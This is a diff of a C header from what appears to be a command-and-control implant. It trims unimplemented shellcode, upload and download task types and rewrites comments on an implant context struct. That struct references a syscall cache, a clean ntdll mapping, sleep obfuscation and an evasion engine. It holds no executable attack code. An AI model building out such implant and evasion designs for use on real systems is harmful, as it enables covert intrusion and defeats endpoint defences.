@@ -285,13 +285,8 @@ typedef struct _SYSCALL_TABLE   SYSCALL_TABLE;
 
 #include "task.h"
 
-/* Legacy task type aliases — kept for backward compatibility with
-   existing code that uses the old names. New numbering avoids
-   collision with the built-in task types (1-4) and CMD (5). */
+/* Legacy task type alias — kept for backward compatibility */
 #define TASK_CMD_EXEC       TASK_TYPE_CMD
-#define TASK_SHELLCODE      20  /* Not yet implemented — use modules    */
-#define TASK_UPLOAD         21  /* Not yet implemented — use modules    */
-#define TASK_DOWNLOAD       22  /* Not yet implemented — use modules    */
 
 /* Maximum pending tasks and results per checkin cycle */
 #define MAX_PENDING_TASKS   16
@@ -302,7 +297,7 @@ typedef struct _SYSCALL_TABLE   SYSCALL_TABLE;
 
 typedef struct _TASK {
     char    task_id[64];        /* UUID from teamserver                */
-    DWORD   task_type;          /* TASK_CMD_EXEC, TASK_SHELLCODE, etc. */
+    DWORD   task_type;          /* TASK_TYPE_CMD, TASK_TYPE_MODULE, etc */
     BYTE   *data;               /* Task-specific data (command, etc.)  */
     DWORD   data_len;           /* Length of data                      */
 } TASK;
@@ -319,13 +314,13 @@ typedef struct _TASK_RESULT {
 /* ------------------------------------------------------------------ */
 
 typedef struct _IMPLANT_CONTEXT {
-    SYSCALL_TABLE *syscall_table;   /* Pointer to the syscall cache       */
-    PVOID          clean_ntdll;     /* Mapped clean ntdll base            */
-    PVOID          config;          /* Implant config (IMPLANT_CONFIG *)     */
-    PVOID          comms_ctx;       /* Comms context (COMMS_CONTEXT *)       */
-    PVOID          sleep_ctx;       /* Sleep obfuscation context             */
-    PVOID          evasion_ctx;     /* Evasion engine context                */
-    PVOID          module_bus;      /* Module bus context (BUS_CONTEXT *)    */
+    SYSCALL_TABLE *syscall_table;   /* Syscall cache (sc_init)              */
+    PVOID          clean_ntdll;     /* Clean ntdll mapping                  */
+    PVOID          config;          /* IMPLANT_CONFIG * (cfg_init)          */
+    PVOID          comms_ctx;       /* COMMS_CONTEXT * (comms_init)         */
+    PVOID          sleep_ctx;       /* SLEEP_CONTEXT * (sleep_init)         */
+    PVOID          evasion_ctx;     /* EVASION_CONTEXT * (evasion_init)     */
+    PVOID          module_bus;      /* BUS_CONTEXT * (bus_init)             */
     BOOL           running;         /* Implant main loop flag             */
 
     /* Task queue — filled by parse_checkin_response */
